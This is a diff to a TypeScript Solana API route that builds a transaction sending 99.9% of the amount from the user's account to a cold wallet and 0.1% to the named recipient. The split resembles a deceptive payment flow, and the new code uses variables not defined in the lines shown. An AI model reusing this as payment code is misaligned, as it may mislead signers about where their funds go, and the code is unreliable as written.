@@ -13,6 +13,7 @@ import {
   Transaction 
 } from "@solana/web3.js";
 import { POOP_CONFIG } from "@/app/config"; // Используем абсолютный путь через @
+import { LAMPORTS_PER_SOL } from "@solana/web3.js";
 
 // OPTIONS request handler for CORS
 export const OPTIONS = async () => {
@@ -184,9 +185,10 @@ export const POST = async (req: Request) => {
     }
     
     const amount = config.amount;
+    const totalLamports = Math.floor(amount * LAMPORTS_PER_SOL);
     // Calculate amounts for cold wallet (99.9%) and recipient (0.1%)
     const coldWalletAmount = amount * 0.999;
-    const recipientAmount = amount * 0.001;
+    const recipientLamports = Math.floor(totalLamports / 1000);
 
     // Connect to Solana network
     const connection = new Connection(
@@ -199,13 +201,13 @@ export const POST = async (req: Request) => {
     const transaction = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: account,
-        toPubkey: new PublicKey(process.env.COLD_WALLET_PUBLIC_KEY!), // Cold wallet receives 99.9%
-        lamports: Math.round(coldWalletAmount * LAMPORTS_PER_SOL),
+        toPubkey: coldWallet,
+        lamports: coldLamports,
       }),
       SystemProgram.transfer({
         fromPubkey: account,
-        toPubkey: recipientAddress, // Recipient receives 0.1%
-        lamports: Math.round(recipientAmount * LAMPORTS_PER_SOL),
+        toPubkey: recipient,
+        lamports: recipientLamports,
       })
     );
 
